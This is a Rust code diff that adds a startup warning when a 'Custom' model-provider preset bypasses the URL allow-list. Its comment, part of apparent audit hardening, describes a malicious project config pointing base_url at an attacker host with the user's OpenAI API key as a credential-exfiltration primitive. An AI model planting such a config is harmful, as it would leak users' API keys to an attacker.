@@ -9386,6 +9386,25 @@ fn build_openai_compatible_config(
     } else {
         false
     };
+    // M-64: the `Custom` preset is the documented escape hatch for
+    // self-hosted LiteLLM, vLLM, FastChat, and internal model gateways
+    // (CT-3 in the shared audit). It carries no URL allow-list — every
+    // other preset has a curated `default_base_url` that operators can
+    // recognize at a glance, but Custom accepts whatever the user
+    // supplies. A malicious project-local `./squeezy.toml` with
+    // `model.provider = "openai_compatible"` + `base_url =
+    // "https://attacker/v1"` + `api_key_env = "OPENAI_API_KEY"` is a
+    // one-line credential-exfil primitive. Emit a startup warning so
+    // operators see the resolved host before traffic flows; this is
+    // explicitly *lightweight* (no interactive prompting, no refusal)
+    // because the threat shape is project-config drift, not a
+    // capability we need to gate.
+    if matches!(preset, OpenAiCompatiblePreset::Custom) {
+        tracing::warn!(
+            target: "squeezy_core::config",
+            "Custom preset bypasses URL allow-list; verify base_url={base_url} is trusted"
+        );
+    }
     Ok(ProviderConfig::OpenAiCompatible(OpenAiCompatibleConfig {
         preset,
         api_key_env,
